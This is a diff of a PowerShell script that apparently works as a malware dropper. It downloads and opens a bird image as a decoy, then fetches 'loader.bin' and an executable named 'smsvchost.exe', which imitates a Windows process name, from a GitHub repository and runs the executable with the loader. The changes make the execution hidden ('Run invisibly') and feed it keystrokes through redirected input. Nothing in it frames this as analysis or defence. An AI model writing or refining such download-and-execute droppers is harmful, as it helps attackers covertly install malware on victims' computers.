@@ -1,9 +1,15 @@
 try {
     # Download the image
-    Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
+    $imageUrl = "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg"
+    $imagePath = "$env:TEMP\blue-bird.jpg"
+    Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
     
     # Open the downloaded image
-    Start-Process "$env:TEMP\blue-bird.jpg"
+    if (Test-Path $imagePath) {
+        Start-Process $imagePath
+    } else {
+        Write-Host "Image download failed."
+    }
 
     # Download loader.bin
     $loaderUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/loader.bin"
@@ -16,17 +22,22 @@ try {
     Invoke-WebRequest -Uri $smsvchostUrl -OutFile $smsvchostPath
 
     # Run smsvchost.exe with loader.bin as an argument in the background
-    $process = Start-Process -FilePath $smsvchostPath -ArgumentList $loaderPath -NoNewWindow -PassThru
+    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $processInfo.FileName = $smsvchostPath
+    $processInfo.Arguments = "`"$loaderPath`""
+    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden  # Run invisibly
+    $processInfo.UseShellExecute = $false  # Required for hidden window
+    $processInfo.RedirectStandardInput = $true  # Redirect standard input to send keys
 
-    # Wait for 1 second
+    $process = [System.Diagnostics.Process]::Start($processInfo)
+
+    # Wait for 1 second to ensure the process is ready
     Start-Sleep -Seconds 1
 
-    # Send the Enter key to the process
-    $wshell = New-Object -ComObject WScript.Shell
-    $wshell.SendKeys("~")  # "~" is the symbol for the Enter key
-
-    # Write-Host "Process executed successfully in the background."
+    # Send the "Enter" key to the process
+    $process.StandardInput.WriteLine()  # Sends an "Enter" key press
+    $process.StandardInput.Close()     # Close the input stream
 }
 catch {
-    # Write-Host "An error occurred: $_"
+    Write-Host "An error occurred: $_"
 }
